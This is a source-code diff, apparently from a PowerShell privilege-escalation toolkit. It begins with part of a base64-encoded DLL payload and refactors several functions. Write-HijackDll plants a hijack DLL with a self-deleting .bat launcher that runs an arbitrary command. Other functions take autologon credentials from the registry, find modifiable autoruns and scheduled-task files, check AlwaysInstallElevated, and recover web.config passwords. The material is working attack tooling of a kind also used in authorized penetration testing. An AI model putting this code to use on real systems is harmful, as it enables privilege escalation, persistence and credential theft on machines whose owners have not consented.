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"
 
-    if($Arch) {
-        if($Arch -eq "x64") {
-            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
-        }
-        elseif($Arch -eq "x86") {
-            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
-        }
-        else{
-            Throw "Please specify x86 or x64 for the -Arch"
-        }
+    if($PSBoundParameters['Architecture']) {
+        $TargetArchitecture = $Architecture
+    }
+    elseif($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {
+        $TargetArchitecture = 'x64'
     }
     else {
-        # if no architecture if specified, try to auto-determine the arch
-        if ($Env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
-            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
-            $Arch = "x64"
-        }
-        else {
-            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
-            $Arch = "x86"
-        }
+        $TargetArchitecture = 'x86'
     }
 
-    if(!$BatPath) {
-        $parts = $OutputFile.split("\")
-        $BatPath = ($parts[0..$($parts.length-2)] -join "\") + "\debug.bat"
+    if($TargetArchitecture -eq 'x64') {
+        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
     }
     else {
-        # patch in the appropriate .bat launcher path
-        $DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString "debug.bat" -ReplaceString $BatPath
+        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
     }
+
+    if($PSBoundParameters['BatPath']) {
+        $TargetBatPath = $BatPath
+    }
+    else {
+        $BasePath = $DllPath | Split-Path -Parent
+        $TargetBatPath = "$BasePath\debug.bat"
+    }
+
+    # patch in the appropriate .bat launcher path
+    $DllBytes = Invoke-PatchDll -DllBytes $DllBytes -SearchString 'debug.bat' -ReplaceString $TargetBatPath
 
     # build the launcher .bat
-    if (Test-Path $BatPath) { Remove-Item -Force $BatPath }
-    "@echo off\n" | Out-File -Encoding ASCII -Append $BatPath
-    "start /b $Command\n" | Out-File -Encoding ASCII -Append $BatPath
-    'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $BatPath
+    if (Test-Path $TargetBatPath) { Remove-Item -Force $TargetBatPath }
 
-    ".bat launcher written to: $BatPath"
+    "@echo off\n" | Out-File -Encoding ASCII -Append $TargetBatPath
+    "start /b $BatCommand\n" | Out-File -Encoding ASCII -Append $TargetBatPath
+    'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $TargetBatPath
 
-    Set-Content -Value $DllBytes -Encoding Byte -Path $OutputFile
-    "$Arch DLL Hijacker written to: $OutputFile"
+    Write-Verbose ".bat launcher written to: $TargetBatPath"
+
+    Set-Content -Value $DllBytes -Encoding Byte -Path $DllPath
+    Write-Verbose "$TargetArchitecture DLL Hijacker written to: $DllPath"
 
     $Out = New-Object PSObject
-    $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
-    $Out | Add-Member Noteproperty 'Architecture' $Arch
-    $Out | Add-Member Noteproperty 'BATLauncherPath' $BatPath
-    $Out | Add-Member Noteproperty 'Command' $Command
+    $Out | Add-Member Noteproperty 'DllPath' $DllPath
+    $Out | Add-Member Noteproperty 'Architecture' $TargetArchitecture
+    $Out | Add-Member Noteproperty 'BatLauncherPath' $TargetBatPath
+    $Out | Add-Member Noteproperty 'Command' $BatCommand
     $Out
 }
 
@@ -2639,19 +2679,24 @@ function Write-HijackDll {
 #
 ########################################################
 
-function Get-RegAlwaysInstallElevated {
+function Get-RegistryAlwaysInstallElevated {
 <#
     .SYNOPSIS
 
-        Checks if the AlwaysInstallElevated registry key is set.
-        This meains that MSI files are always run with SYSTEM
-        level privileges.
+        Checks if any of the AlwaysInstallElevated registry keys are set.
+
+    .DESCRIPTION
+
+        Returns $True if the HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+        or the HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated keys
+        are set, $False otherwise. If one of these keys are set, then all .MSI files run with
+        elevated permissions, regardless of current user permissions.
 
     .EXAMPLE
 
-        PS C:\> Get-RegAlwaysInstallElevated
+        PS C:\> Get-RegistryAlwaysInstallElevated
 
-        Checks if the AlwaysInstallElevated registry key is set.
+        Returns $True if any of the AlwaysInstallElevated registry keys are set.
 #>
 
     [CmdletBinding()]
@@ -2667,7 +2712,7 @@ function Get-RegAlwaysInstallElevated {
 
         if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
 
-            $HKCUval = (Get-ItemProperty -Path "hkcu:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
+            $HKCUval = (Get-ItemProperty -Path "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
             Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"
 
             if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
@@ -2693,16 +2738,21 @@ function Get-RegAlwaysInstallElevated {
 }
 
 
-function Get-RegAutoLogon {
+function Get-RegistryAutoLogon {
 <#
     .SYNOPSIS
 
-        Checks for DefaultUserName/DefaultPassword in the Winlogin registry section
-        if the AutoAdminLogon key is set.
+        Finds any autologon credentials left in the registry.
+
+    .DESCRIPTION
+
+        Checks if any autologon accounts/credentials are set in a number of registry locations.
+        If they are, the credentials are extracted and returned as a custom PSObject.
 
     .EXAMPLE
 
-        PS C:\> Get-RegAutoLogon
+        PS C:\> Get-RegistryAutoLogon
+
         Finds any autologon credentials left in the registry.
 
     .LINK
@@ -2717,7 +2767,7 @@ function Get-RegAutoLogon {
 
     Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"
 
-    if ($AutoAdminLogon.AutoAdminLogon -ne 0){
+    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {
 
         $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
         $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
@@ -2740,21 +2790,29 @@ function Get-RegAutoLogon {
 }
 
 
-function Get-VulnAutoRun {
+function Get-RegistryAutoRun {
 <#
     .SYNOPSIS
+        
+        Returns any elevated system autoruns in which the current user can
+        modify part of the path string.
 
-        Returns HKLM autoruns where the current user can modify
-        the binary/script (or its config) specified.
+    .DESCRIPTION
+
+        Enumerates a number of autorun specifications in HKLM and filters any
+        autoruns through Get-ModifiablePath, returning any file/config locations
+        in the found path strings that the current user can modify.
 
     .EXAMPLE
 
-        PS C:\> Get-VulnAutoRun
+        PS C:\> Get-RegistryAutoRun
 
         Return vulneable autorun binaries (or associated configs).
 #>
 
-    [CmdletBinding()]Param()
+    [CmdletBinding()]
+    Param()
+    
     $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                             "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                             "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
@@ -2777,7 +2835,7 @@ function Get-VulnAutoRun {
 
             $Path = $($Keys.GetValue($Name))
 
-            $Path | Get-ModifiableFile | ForEach-Object {
+            $Path | Get-ModifiablePath | ForEach-Object {
                 $Out = New-Object PSObject
                 $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                 $Out | Add-Member Noteproperty 'Path' $Path
@@ -2793,22 +2851,29 @@ function Get-VulnAutoRun {
 
 ########################################################
 #
-# Misc.
+# Miscellaneous checks
 #
 ########################################################
 
-function Get-VulnSchTask {
+function Get-ModifiableScheduledTaskFile {
 <#
     .SYNOPSIS
 
-        Returns scheduled tasks where the current user can modify
-        the script associated with the task action.
+        Returns scheduled tasks where the current user can modify any file
+        in the associated task action string.
+
+    .DESCRIPTION
+
+        Enumerates all scheduled tasks by recursively listing "$($ENV:windir)\System32\Tasks"
+        and parses the XML specification for each task, extracting the command triggers.
+        Each trigger string is filtered through Get-ModifiablePath, returning any file/config 
+        locations in the found path strings that the current user can modify.
 
     .EXAMPLE
 
-        PS C:\> Get-VulnSchTask
+        PS C:\> Get-ModifiableScheduledTaskFile
 
-        Return vulnerable scheduled tasks.
+        Return scheduled tasks with modifiable command strings.
 #>
 
     [CmdletBinding()]Param()
@@ -2819,7 +2884,7 @@ function Get-VulnSchTask {
     $Path = "$($ENV:windir)\System32\Tasks"
 
     # recursively enumerate all schtask .xmls
-    Get-ChildItem -Path $Path -Recurse | Where-Object { ! $_.PSIsContainer } | ForEach-Object {
+    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
         try {
             $TaskName = $_.Name
             $TaskXML = [xml] (Get-Content $_.FullName)
@@ -2828,7 +2893,7 @@ function Get-VulnSchTask {
                 $TaskTrigger = $TaskXML.Task.Triggers.OuterXML
 
                 # check schtask command
-                $TaskXML.Task.Actions.Exec.Command | Get-ModifiableFile | ForEach-Object {
+                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                     $Out = New-Object PSObject
                     $Out | Add-Member Noteproperty 'TaskName' $TaskName
                     $Out | Add-Member Noteproperty 'TaskFilePath' $_
@@ -2837,7 +2902,7 @@ function Get-VulnSchTask {
                 }
 
                 # check schtask arguments
-                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiableFile | ForEach-Object {
+                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                     $Out = New-Object PSObject
                     $Out | Add-Member Noteproperty 'TaskName' $TaskName
                     $Out | Add-Member Noteproperty 'TaskFilePath' $_
@@ -2847,7 +2912,7 @@ function Get-VulnSchTask {
             }
         }
         catch {
-            Write-Debug "Error: $_"
+            Write-Verbose "Error: $_"
         }
     }
 
@@ -2970,6 +3035,7 @@ function Get-WebConfig {
 
     # Check if appcmd.exe exists
     if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {
+
         # Create data table to house results
         $DataTable = New-Object System.Data.DataTable
 
@@ -3022,38 +3088,35 @@ function Get-WebConfig {
                             $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                         }
                     }
-
                 }
                 else {
 
                     # Find newest version of aspnet_regiis.exe to use (it works with older versions)
-                    $aspnet_regiis_path = Get-ChildItem -Recurse -filter aspnet_regiis.exe c:\Windows\Microsoft.NET\Framework\ | Sort-Object -Descending | Select-Object fullname -First 1
+                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1
 
